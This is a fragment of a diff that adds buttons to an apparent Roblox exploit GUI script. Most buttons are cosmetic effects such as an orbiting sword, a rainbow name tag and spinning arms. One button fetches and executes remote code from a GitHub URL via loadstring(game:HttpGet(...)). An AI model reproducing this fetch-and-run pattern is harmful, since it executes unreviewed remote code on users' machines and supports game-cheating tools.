+				part.Color = Color3.new(0.8, 0.8, 0.8) -- light gray or original color
+			end
+		end
+	end
+
+	-- Remove outline/Highlight if present
+	for _, obj in pairs(character:GetChildren()) do
+		if obj:IsA("Highlight") then
+			obj:Destroy()
+		end
+	end
+end
+
+-- Listen for the correct player's character
+Players.PlayerAdded:Connect(function(player)
+	if player.UserId == YOUR_USER_ID then
+		player.CharacterAdded:Connect(function(character)
+			wait(1)
+			removeNeonGlow(character)
+		end)
+	end
+end)
+
+-- Instant cleanup if already in game
+for _, player in ipairs(Players:GetPlayers()) do
+	if player.UserId == YOUR_USER_ID and player.Character then
+		removeNeonGlow(player.Character)
+	end
+end
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "ANIMATION🚶‍♂️2️⃣●5️⃣",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Emerson2-creator/Scripts-Roblox/refs/heads/main/ScriptR6/AnimGuiV2.lua'))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "ORBIT A HOLY SWORD IN YOUR CHARACTER [ONLY YOURSELF]🪐🇻🇦🗡",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+
+-- Create the holy sword
+local sword = Instance.new("Part")
+sword.Name = "HolySword"
+sword.Size = Vector3.new(1, 4, 1)
+sword.BrickColor = BrickColor.new("Institutional white")
+sword.Material = Enum.Material.Neon
+sword.Anchored = true
+sword.CanCollide = false
+sword.Parent = workspace
+
+-- Optional: Add a glowing mesh to make it more 'holy'
+local mesh = Instance.new("SpecialMesh", sword)
+mesh.MeshType = Enum.MeshType.FileMesh
+mesh.MeshId = "rbxassetid://1279013"  -- Classic sword mesh
+mesh.Scale = Vector3.new(2, 2, 2) -- Medium size
+
+-- Orbiting loop
+local RunService = game:GetService("RunService")
+local radius = 5
+local speed = 2
+
+RunService.RenderStepped:Connect(function()
+	local hrp = character:FindFirstChild("HumanoidRootPart")
+	if hrp then
+		local time = tick() * speed
+		local offset = Vector3.new(math.cos(time) * radius, 2, math.sin(time) * radius)
+		sword.Position = hrp.Position + offset
+	end
+end)
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Undo a Holy Sword Orbit🇻🇦🗡 ",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+local player = game:GetService("Players").LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+
+-- Look for the orbiting sword in workspace
+for _, obj in pairs(workspace:GetChildren()) do
+	if obj:IsA("Part") and (obj.Name == "HolySword" or obj.Name == "HolyFlameSword") then
+		obj:Destroy()
+	end
+end
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Hold a Holy Sword🇻🇦🗡",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+
+-- Detect right hand/arm
+local rightArm = character:FindFirstChild("RightHand") or character:FindFirstChild("Right Arm")
+if not rightArm then
+	warn("Right arm not found")
+	return
+end
+
+-- Create Holy Sword part
+local sword = Instance.new("Part")
+sword.Name = "HolySword"
+sword.Size = Vector3.new(1, 4, 1)
+sword.BrickColor = BrickColor.new("Institutional white")
+sword.Material = Enum.Material.Neon
+sword.CanCollide = false
+sword.Anchored = false
+
+-- Use classic Linked Sword mesh
+local mesh = Instance.new("SpecialMesh")
+mesh.MeshType = Enum.MeshType.FileMesh
+mesh.MeshId = "rbxassetid://1279013" -- Classic sword model
+mesh.TextureId = "rbxassetid://10907548" -- Optional: sword texture
+mesh.Scale = Vector3.new(2, 2, 2)
+mesh.Parent = sword
+
+-- Parent to character
+sword.Parent = character
+
+-- Weld to the right hand with proper grip
+local weld = Instance.new("Weld")
+weld.Part0 = rightArm
+weld.Part1 = sword
+
+-- ✅ Classic sword hold position (pointing forward/down in front)
+weld.C0 = CFrame.new(0, -1.3, -0.8) * CFrame.Angles(math.rad(90), math.rad(0), math.rad(90))
+weld.Parent = rightArm
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Undo Holy Sword Holding🇻🇦🗡",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+local player = game:GetService("Players").LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+
+-- Remove Holy Sword and its weld
+for _, item in pairs(character:GetChildren()) do
+	if item:IsA("Part") and item.Name == "HolySword" then
+		item:Destroy()
+	end
+end
+
+-- Optionally: also clean up any leftover welds (extra safe)
+for _, item in pairs(character:GetDescendants()) do
+	if item:IsA("Weld") and item.Part1 and item.Part1.Name == "HolySword" then
+		item:Destroy()
+	end
+end
+   end,
+})
+
+local Tab = Window:CreateTab("H4XXING GUI FEATURE💀⚡️[3]", 4483362458) -- Title, Image
+
+local Button = Tab:CreateButton({
+   Name = "RBG NAME🌈🏷",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+-- Put this in a LocalScript (StarterPlayerScripts for best result)
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+
+-- Wait for the HumanoidRootPart
+local hrp = character:WaitForChild("HumanoidRootPart")
+
+-- Create Billboard GUI
+local billboard = Instance.new("BillboardGui")
+billboard.Name = "RGBNameTag"
+billboard.Adornee = hrp
+billboard.Size = UDim2.new(0, 200, 0, 50)
+billboard.StudsOffset = Vector3.new(0, 3, 0)
+billboard.AlwaysOnTop = true
+billboard.Parent = character
+
+-- Create TextLabel
+local label = Instance.new("TextLabel")
+label.Size = UDim2.new(1, 0, 1, 0)
+label.BackgroundTransparency = 1
+label.TextScaled = true
+label.TextStrokeTransparency = 0
+label.Font = Enum.Font.GothamBlack
+label.Text = player.Name
+label.Parent = billboard
+
+-- Rainbow Effect Function
+local hue = 0
+RunService.RenderStepped:Connect(function()
+	hue = (hue + 0.01) % 1
+	local color = Color3.fromHSV(hue, 1, 1)
+	label.TextColor3 = color
+end)
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "UNDO RBG NAME🏷🌈",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+-- Put this in a LocalScript (like in StarterPlayerScripts)
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+
+-- Remove the RGB name tag if it exists
+local rgbName = character:FindFirstChild("RGBNameTag")
+if rgbName then
+	rgbName:Destroy()
+end
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "GOOFY V1(R6)👤",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local runService = game:GetService("RunService")
+
+-- Wait for all required body parts
+local torso = character:WaitForChild("Torso")
+local leftArm = character:WaitForChild("Left Arm")
+local rightArm = character:WaitForChild("Right Arm")
+local rootPart = character:WaitForChild("HumanoidRootPart")
+
+-- Stop animations
+local humanoid = character:WaitForChild("Humanoid")
+humanoid:LoadAnimation(Instance.new("Animation")) -- Stop all animations
+
+-- Anchor everything to control pose
+torso.Anchored = true
+leftArm.Anchored = true
+rightArm.Anchored = true
+rootPart.Anchored = true
+
+-- T-pose arm positions
+leftArm.CFrame = torso.CFrame * CFrame.new(-1.5, 0.5, 0)
+rightArm.CFrame = torso.CFrame * CFrame.new(1.5, 0.5, 0)
+
+-- Spin both arms continuously
+local leftAngle = 0
+local rightAngle = 0
+
+runService.RenderStepped:Connect(function(dt)
+	leftAngle = leftAngle + dt * 10
+	rightAngle = rightAngle + dt * 10
+
+	leftArm.CFrame = torso.CFrame * CFrame.new(-1.5, 0.5, 0) * CFrame.Angles(0, 0, leftAngle)
+	rightArm.CFrame = torso.CFrame * CFrame.new(1.5, 0.5, 0) * CFrame.Angles(0, 0, rightAngle)
+end)
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "UNDO GOOFY V1(R6)👤",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:WaitForChild("Humanoid")
+
+-- Unanchor all body parts
+for _, partName in pairs({"Torso", "Left Arm", "Right Arm", "HumanoidRootPart"}) do
+	local part = character:FindFirstChild(partName)
+	if part then
+		part.Anchored = false
+	end
+end
+
+-- Optional: Play idle animation again (automatically handled by Roblox after unanchor)
+humanoid:LoadAnimation(Instance.new("Animation")) -- Triggers default animations to resume
+   end,
+})
